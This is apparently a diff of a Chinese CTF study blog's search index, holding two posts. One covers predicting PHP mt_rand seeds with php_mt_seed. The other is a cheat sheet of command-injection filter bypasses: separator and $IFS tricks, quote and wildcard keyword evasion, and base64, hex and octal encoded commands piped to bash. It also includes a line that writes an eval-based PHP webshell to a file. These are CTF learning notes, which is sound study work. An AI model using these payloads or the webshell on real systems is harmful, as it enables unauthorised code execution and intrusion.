-<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
-<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
-<p>平台：ctfshow    web入门  web25</p>
-<p>下面放出 此题的wp ：</p>
-<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
-<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>php伪随机数漏洞</category>
       </categories>
   </entry>
   <entry>
@@ -922,6 +1040,131 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>eval与assert</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php伪随机数漏洞</title>
+    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
+    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
+<a id="more"></a>
+<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
+<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
+<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
+<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
+<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
+<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
+<p>这张图能帮助我们更好的了解php伪随机数</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
+<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
+<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
+<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
+<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
+那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
+<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
+<p>kali下，进入目录，make</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
+<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
+<p>可以得到种子</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
+<p>验证种子是否一样就是看 输出的序列是否一样</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
+<h2 id="相关习题"><a class="header-anchor" href="#相关习题">¶</a>相关习题</h2>
+<p>平台：ctfshow    web入门  web25</p>
+<p>下面放出 此题的wp ：</p>
+<p><a href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
+<p>参考博客  ：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>php伪随机数漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ping命令执行及bypass</title>
+    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
+    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
+<a id="more"></a>
+<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
+<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
+<blockquote>
+<p><code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
+<blockquote>
+<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
+<p>使用下面两个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
+<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
+<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
+$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
+加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
+不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
+<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
+<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
+<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
+<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
+<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
+<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
+<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
+<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
+<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
+<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
+<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
+<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
+<blockquote>
+<p>more:一页一页的显示档案内容<br>
+less:与 more 类似<br>
+head:查看头几行<br>
+tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
+tail:查看尾几行<br>
+nl：显示的时候，顺便输出行号<br>
+od:以二进制的方式读取档案内容<br>
+vi:一种编辑器，这个也可以查看<br>
+vim:一种编辑器，这个也可以查看<br>
+sort:可以查看<br>
+uniq:可以查看<br>
+file -f:报错出具体内容</p>
+</blockquote>
+<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
+<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
+<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
+<hr>
+<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
+<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
+<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>命令执行</category>
       </categories>
   </entry>
   <entry>
@@ -1027,90 +1270,6 @@ payload: cat flag.php||</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getcwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件 </span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line"></span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>other:    <strong>array_flip可以替换为array_reverse</strong></p>
 <pre><code>			**readfile可以替换为show_source  和 highlight_flie**</code></pre>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ping命令执行及bypass</title>
-    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
-    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
-<a id="more"></a>
-<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
-<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
-<blockquote>
-<p><code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
-<blockquote>
-<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
-<p>使用下面两个</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
-<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
-<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
-$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
-加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
-不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
-<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
-<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
-<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
-<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
-<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
-<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
-<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
-<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
-<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
-<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
-<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
-<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
-<blockquote>
-<p>more:一页一页的显示档案内容<br>
-less:与 more 类似<br>
-head:查看头几行<br>
-tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
-tail:查看尾几行<br>
-nl：显示的时候，顺便输出行号<br>
-od:以二进制的方式读取档案内容<br>
-vi:一种编辑器，这个也可以查看<br>
-vim:一种编辑器，这个也可以查看<br>
-sort:可以查看<br>
-uniq:可以查看<br>
-file -f:报错出具体内容</p>
-</blockquote>
-<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
-<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
-<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
-<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
-<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
-<hr>
-<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
-<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
-<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
-<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
 ]]></content>
       <categories>
         <category>web技术学习</category>
